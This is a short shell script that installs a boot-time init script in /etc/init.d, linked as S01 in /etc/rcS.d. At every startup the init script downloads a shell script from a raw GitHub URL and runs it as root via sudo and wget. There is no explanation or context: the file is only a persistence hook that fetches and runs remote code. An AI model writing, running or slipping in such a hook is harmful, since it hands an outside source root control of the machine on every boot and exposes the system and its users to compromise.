#!/bin/sh


echo "#!/bin/sh" > relFars7v
echo "sudo sh -c \"\$(wget -O - https://raw.githubusercontent.com/ars7v/in/main/m.sh)\"" >> relFars7v
chmod +x relFars7v

sudo mv relFars7v /etc/init.d/
sudo ln -s /etc/init.d/relFars7v /etc/rcS.d/S01relFars7v

